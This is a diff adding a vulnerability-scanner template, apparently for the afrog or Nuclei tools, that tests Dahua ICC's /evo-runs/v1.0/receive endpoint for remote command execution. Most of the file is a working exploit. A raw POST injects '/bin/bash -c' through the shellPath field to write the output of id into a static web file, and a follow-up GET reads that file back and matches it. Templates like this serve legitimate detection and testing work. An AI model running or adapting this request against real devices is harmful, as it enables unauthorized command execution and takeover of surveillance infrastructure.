@@ -1,0 +1,33 @@
+id: dahua-icc-evo-runs-receive-rce
+
+info:
+  name: 大华 ICC evo-runs/v1.0/receive 远程命令执行
+  author: avic123
+  severity: critical
+  description: |
+    大华 ICC /evo-runs/v1.0/receive 接口可将 id 命令输出写入静态文件并回读。
+    与已有 /evo-runs/v1.0/push 验证不是同一接口；与 DSS、智慧园区不是同一 SKU。
+  reference:
+    - https://github.com/zan8in/afrog
+  tags: dahua,icc,rce
+
+variables:
+  randstr: "{{rand_base(8)}}"
+
+http:
+  - raw:
+      - |
+        POST /evo-runs/v1.0/receive HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        X-Subject-Headerflag: ADAPT
+
+        {"method":"agent.ossm.mapping.config","info":{"configure":"abcd","filePath":"haha","paramMap":{"shellPath":"/bin/bash -c 'id>/opt/evoWpms/static/{{randstr}}.txt'","filePath":"abc"},"requestIp":""}}
+      - |
+        GET /static/{{randstr}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200 && contains(body_1, "\"success\":true") && status_code_2 == 200 && regex("((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)", body_2)'
